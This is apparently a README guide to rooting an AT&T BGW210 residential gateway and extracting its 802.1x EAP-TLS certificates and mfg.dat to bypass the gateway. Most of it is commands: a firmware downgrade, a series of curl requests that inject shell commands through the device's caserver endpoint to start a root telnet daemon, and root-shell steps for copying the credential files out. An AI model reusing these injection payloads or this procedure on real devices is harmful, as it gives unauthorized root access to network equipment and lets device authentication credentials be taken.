# BypassAttRG

This method works to rip the 802.1x keys from BGW210.

<!-- **Background**: I switched to AT&T fiber and I hate AT&T's residential gateways -->


## Menu
- [Prerequisites](#prerequisites)
- [Extract Certificates](#extract-certificates)
- [Configuring 802.1x authentication](#configuring-8021x-authentication)
- [Miscellaneous](#miscellaneous)
- [Credits & References](#credits--references)

  
## Prerequisites
- [Python 3](https://www.python.org/downloads/release/python-373/) for the local http server. There are many alternatives(e.g. [mobaxterm](https://mobaxterm.mobatek.net/)).
- Basic knowledge of POSIX commands (cd, mkdir, wget, etc.).
- A BGW210

[Back to menu](#menu)
## Extract Certificates Tested
The certificates extracted from both NVG589 and BGW210 work fine from my tests using Mikrotik's RB4011 and CCR2004 w/switch in front to remove VLAN0 802.1p tags that AT&T feels they MUST use.

### Downgrade

Before downgrading, you may want to determine the current firmware version for your RG.

Navigate to http://192.168.1.254
- Click Diagnostics
- Click Update

On this screen, you will see the current firmware revision. If, after this process, you desire to update the RG to the displayed version, that version may be downloaded here:

`http://gateway.c01.sbcglobal.net/firmware/001E46/BGW210-700_2.5.6/spTurquoise210-700_2.5.6.bin`

Change the `2.5.6` in the URI to that of your version, and paste into a web browser. It should download. If it doesn't, try searching the web for it. ATT signs its firmware and it is validated during the firmware installation process.

Once you have a copy of the current version of your firmware:

Download the signed 1.0.29 firmware, then go to http://192.168.1.254
- Click Diagnostics
- Click Update

Navigate to where you saved the 1.0.29 version of the firmware and select it.

Give the gateway 3 minutes to restart since it's a POS.

## Ripping Certs

Once downgraded, go to http://192.168.1.254/cgi-bin/ipalloc.ha
- type your device access code to login
- assign a static IP to your PC that you'll be executing the CURL commands from

I assigned my PC: 192.168.1.70 since that's what the RG's DHCP-Server had assigned it.

Once you assign a static IP,  refresh your PC's local ip address. using ifconfig, or ipconfig if on windows (cmd prompt: ipconfig /release and then ipconfig /renew). You may ignore this step if you assigned the same IPv4 it received by the DHCP-Server.

Once that's done, open http://192.168.1.254/cgi-bin/ipalloc.ha and authenticate again if it asks.

Once you authenticate, run these CURL commands (remember to navigate to cURL, see my video for help).

**tech has no password when prompted**

```
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -a /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -s|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| reboot|" -v --http1.1 https://192.168.1.254:49955/caserver
```
 
The AT&T RG (BGW210) will reboot after the final command, and you'll be able to telnet on port 28 as admin w/ device access code as the password once it reboots. 

(Use Putty if using a Windows PC)
 
Once you're logged in via telnet, type `!` and press enter to elevate to a root sh terminal

If your RG still has connectivity to the Internet, you may want to consider terminating the auto firmware update process to prevent it from doing so in the middle of this process.  To do so, follow these steps:

Run the command: `ps | grep firmware | grep -v grep`

What we're looking for here is `/usr/bin/udpsvd -E 0 69 tftpd /lib/firmware`

```
# ps | grep firmware | grep -v grep
 1079 root      1348 S    /usr/bin/udpsvd -E 0 69 tftpd /lib/firmware
```

Kill the process with the kill command:
```
# kill -9 1079
```

_in the video I mistook the other four digit number for the PIV by mistake initially, then corrected myself_

This kills the auto update script so that you can make changes, or copy your 802.11x certificates without the ATT firmware automatically updating when you aren't ready for it. Again, not really as important if you don't have the RG connected to the ONT (I didn't in the video).

#### Extract Certificates
- In BGW210, run the following commands in order. Make sure you are in root shell. Reminder - Type `!`. It switches to root shell.

```
mount -o remount,rw /dev/ubi0 /  
mount mtd:mfg -t jffs2 /mfg
cp /mfg/mfg.dat /www/att/mfg.dat
```

### Download
You may right click and save link as from web browser:
  - [mfg.dat](http://192.168.1.254/mfg.dat)

If you're a mac user, you may use curl from your mac terminal:
  - `curl http://192.168.1.254/mfg.dat -o mfg.dat`
  
## Next:
  
```
cd /tmp
tar cf cert.tar /etc/rootcert/
cp cert.tar /www/att/images
```

### Download
You may right click and save link as from web browser:
  - [cert](http://192.168.1.254/images/cert.tar)

If you're a mac user, you may use curl from your mac terminal:
  - `curl http://192.168.1.254/images/cert.tar -o cert.tar`

- Reminder: Download http://192.168.1.254/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.

Congrats, you now have the certs! Refer to [Configuring 802.1x authentication](#configuring-8021x-authentication) to decode

### Re-upgrading your firmware.

In this section, follow these steps to re-upgrade your firmware. This has only been documented for mac users.

Via the mac terminal, navigate to the directory where the firmware you wish to apply has been stored. From that directory, run this command to start a python HTTP server

`sudo python -m SimpleHTTPServer 80`

From another terminal session, telnet to the RG, and use the `fwinstall` command to update. Supply the IP address of your mac, the one you allocated in the step above. (I.E. replace 192.168.1.107 below with YOUR ip address)

```
 ➜  ~ telnet 192.168.1.254 28
Trying 192.168.1.254...
Connected to dsldevice.attlocal.net.
Escape character is '^]'.

login: admin
Password:
Axis/R91NG8JM403400> fwinstall http://192.168.1.107/spTurquoise210-700_2.5.6.bin
console output redirected to this session
Axis/R91NG8JM403400> 
*** Unsolicited event 12
TR69: (active) system.firmware.install-state = 'Idle'
Axis/R91NG8JM403400> 
*** Unsolicited event 12
P0000-00-00T00:04:23 L5 sdb[1003]: firmware download started
Axis/R91NG8JM403400> 
TR69: (active) system.firmware.install-state = 'Downloading'
Axis/R91NG8JM403400> 
P0000-00-00T00:04:23 L5 cwmp[2823]: DSLF_WanMgmtChg path[system.firmware.install-state] val[Idle]
P0000-00-00T00:04:23 L5 cwmp[2823]: DSLF_WanMgmtChg path[system.firmware.install-state] val[Downloading]
Axis/R91NG8JM403400> 
P0000-00-00T00:04:26 L5 sdb[1003]: Signed image is validated - filename sTurquoise210-700_2.5.6.bin
Axis/R91NG8JM403400> 
P0000-00-00T00:04:30 L3 wlcfg_rpcd[1727]: retrying RPC communication with 5G module
Axis/R91NG8JM403400> 
P0000-00-00T00:04:41 L3 wlcfg_rpcd[1727]: retrying RPC communication with 5G module
Axis/R91NG8JM403400> 
P0000-00-00T00:04:52 L3 wlcfg_rpcd[1727]: retrying RPC communication with 5G module
Axis/R91NG8JM403400> 
*** Unsolicited event 12
Axis/R91NG8JM403400> 
P0000-00-00T00:04:58 L5 sdb[1003]: system reboot requested in 5 seconds
Axis/R91NG8JM403400> 
*** Unsolicited event 13
Axis/R91NG8JM403400> 
P0000-00-00T00:04:58 L4 sdb[1003]: shutting down WAN conn for reboot
Axis/R91NG8JM403400> 
TR69: (active) system.firmware.install-state = 'Image validated'
Axis/R91NG8JM403400> 
P0000-00-00T00:04:59 L5 cwmp[2823]: DSLF_WanMgmtChg path[system.firmware.install-state] val[Image validated]
Axis/R91NG8JM403400> 
P0000-00-00T00:05:03 L3 wlcfg_rpcd[1727]: retrying RPC communication with 5G module
Axis/R91NG8JM403400> 
P0000-00-00T00:05:04 L5 sdb[1003]: DNS: failed to switch resolver config file - No such file or directory
Axis/R91NG8JM403400> 
P0000-00-00T00:05:05 L5 sdb[1003]: disable service: ssh
P0000-00-00T00:05:05 L5 sdb[1003]: disable service: telnet
Axis/R91NG8JM403400> Connection closed by foreign host.
```

The RG has been updated back to its original version prior to downgrade. However, any configurations in existence may have to be reconfigured such as SSID name, passwords, etc.

[Back to menu](#menu)
## Configuring 802.1x authentication
### Decode Credentials 
Credit: [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)

- Download decoder v1.0.4: [win](decoder/win/mfg_dat_decode_1_04.zip), [linux](decoder/linux/mfg_dat_decode_1_04.tar.gz), [mac](decoder/mac/mfg_dat_decode_1_04_macosx.zip)
  - [Original download page](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)
- Copy *mfg.dat*, unzip *cert.tar* to the same location as *mfg_dat_decode*.
- Run *mfg_dat_decode*. You should get a file like this: *EAP-TLS_8021x_XXXX*.

## Miscellaneous

### Compile Entware packages from source
Some useful links
- [Compile-packages-from-sources](https://github.com/Entware/Entware/wiki/Compile-packages-from-sources)
- [Compile-custom-programs-from-source](https://github.com/RMerl/asuswrt-merlin/wiki/Compile-custom-programs-from-source)

[Back to menu](#menu)
## Credits & References
- [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html): EAP-TLS credentials decoder and the method to extract */mfg/mfg.dat*
- [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui): Rooting The NVG510 from the WebUI
- [nomotion](https://www.nomotion.net/blog/sharknatto/): NVG589 root exploit
- [dslreports.com](https://www.dslreports.com/forum/uverse): A great forum with many useful information.
- [jsolo1@dslreports.com](https://www.dslreports.com/profile/422016): Provides many helpful & useful suggestions.
- [Streiw](https://www.reddit.com/r/ATT/comments/g59rwm/bgw210700_root_exploitbypass/): Creator of BGW210 Pastebin guide and discover of exploit and main hero of BGW210 root.

[Back to menu](#menu)
